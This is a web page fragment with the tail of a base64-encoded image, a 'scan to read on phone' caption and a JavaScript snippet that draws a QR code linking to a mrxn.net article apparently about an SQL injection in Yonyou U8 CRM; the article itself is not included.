qtcL0hq7v1Qm36DMnGwE/ALq/njadqNU49XGuJU+ucOvg8u1x9qSkWeg6eAWtWT9B7k4N74wv3OtgH9z/bgGu9J/n1huROvAmPhWTTsN7erq4/A6x7VBNgrkurANeBKo841x3J52+P8k/L9ld6w90IjL8mAW4lYGjpCd8MX0HVE4e/LHcE82xwPhZy5/6rwjX87A6M77LA28lWO2dA9JrXWPXk4Jm7PPqKYe7VXCFexQLYB/esupCeHcsjqC4WwPMUC+BcngqY9eoF12Dm2r+KrzdkdVdeqI3vsnbXB283dbjP9VQI8SheIfUzhnl+98J5Xf5cG+yFNcsrgOvqgyOuuXwCuK5YkEeAQ1f+DNRfkZ7rDal35Q3iaSFwbLqeDaxni7WWGOwBc9fPeuPdecAzd3X1pwb2SqtIvWqKq54Y5hnR5X8EcC/MnD6wvps5PtRjfsTgYfFpaI1rDrM3PrAO5uhiuNeka66guEJaEP27OfiacHBmde6zU696jVOvnDoc1wNulukNualX8LI7MH2oZ3s5TfLOqQPjBycg0u2/i42QXmB4o4dTF3cN5h5wDub4xTBrmifArMOcyxNoTkXXwb3wmOscxTD3SBNyDXD9ekN0V94I4zMkW+rnAm8NZu6+VZ6Z4N7knYFbe2rAeJt6fjMugkjg3uRhsJ6ZXQci3RgY5wBz713laU4t3PXk4fiuNyR35E14LAT8BIC5ny3bC4N9yuMFa2COLo+QHOZ6dDG4Jr8AzlWrUE1YadKFWqsxnM9Ub1D7FMPcC3MuTwCugbnru2uMhcR88evvwPRdVj9OtgjeMpirL56q1RjcA+Yz/1mtzkwMnqkcjlj5s6jXBM8Ac59RvbVW9cTh6qsxzNcA59cbUu/SG8RPfZeVc55tPbXwMz3yyA9+OpRXqFaRGqz9qf8JA3dt9dqKgfFdl2KhNwA3CTj1ql8A+9J4vSG5E2/C4zMEvCVtTADn/Yyw1qsPHnvkh3sfWIM1q0/QGSukBTD3Rn+GMzNe8KzkYbDe/amLUwN7pa0QX/h6Q1Z36YXa+AzJ9cHbzLZ2HH9lcG/VzuLMlqfGNd/p8gjga8Lxn9tIF3qvtIrUwTNqLfHHx/y//0tP6uBeMEsHx2DuPfKc4XpDzu7OC2pjIdliGLzdfh6w3n3AzZpaBGB8t5E8DNbh4NR2DIcXmGzAdB1wnvOE0wSuJxfDvSY9vXBel7cD1j1gHWYeC+lDcoBn9J0XfKFdfaWvNJ3hkZ66WH5BsQA+B5ilCfJ0SBe6Du7t+ipX/wrxppa883Ih3XTl/+4OTN/2gp8EOOccT9sGe6OBc9UEcN7rcOjyCXBo8sOcS1sBWMlLDZi+tK1MOosA9ioWulea0HXl4F7FFWBdfStcb0i9W28Qj4WsNrXSnjlv+uD8SYhPM8FexRXVI73n0gTp4jPIc4baC/N5YM4zp/b0+BmPemCePRaiwoX3uAPTQsDbgpl3R4XjB7I8EeDenu9mPKODZ3YvWIeDuyc5HB444tTFYD1nlyYkD0sTwH7FAViDmVPPDHA9OjifFpLixX/3DpxN//FCwJvNRfoT0HOwH8ypVwbXwJxav0bXVV9pK737kovB11WfAM/l6pW/QlpFalWr8Y8Xkgtc/P/cgR8vJNsFP0Vgjt6P2XWwH+jWhzkwfqbQzJjBGpi7vsulg3s0bwV5hFVN2qoGnglrVk/FjxdSh13xz+/AtBBteYXdZeRNTbGQvLNqwkrvWnL5heTgpyy5agLcf7cXzyMGzwQeWcfbCPc+YNQ0AI5Y+Q46twCzf1rIrvnS/90dGAsBbwnO+ZljaevCzgu+hjwCHE/3d3rAc4DRBoynFMyaXTFMn79VTfGnNH7VGDxjFMpv8ggw16UJxXo7i3Sh1hSDZ6gmSBPGQhRceI878B8AAAD//5x+0HUAAAAGSURBVAMAkt+BvMexZuEAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 